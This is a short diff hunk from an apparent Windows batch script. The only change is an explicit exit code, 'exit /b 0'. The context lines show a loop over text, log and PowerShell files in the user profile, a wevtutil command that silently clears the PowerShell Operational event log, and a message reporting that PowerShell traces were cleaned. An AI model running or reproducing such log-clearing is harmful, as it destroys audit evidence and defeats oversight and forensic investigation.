@@ -336,4 +336,4 @@ for /r "%userprofile%" %%F in (*.txt *.log *.ps1) do (
 wevtutil cl "Microsoft-Windows-PowerShell/Operational" >nul 2>&1
 
 echo PowerShell traces cleaned.
-exit /b
+exit /b 0
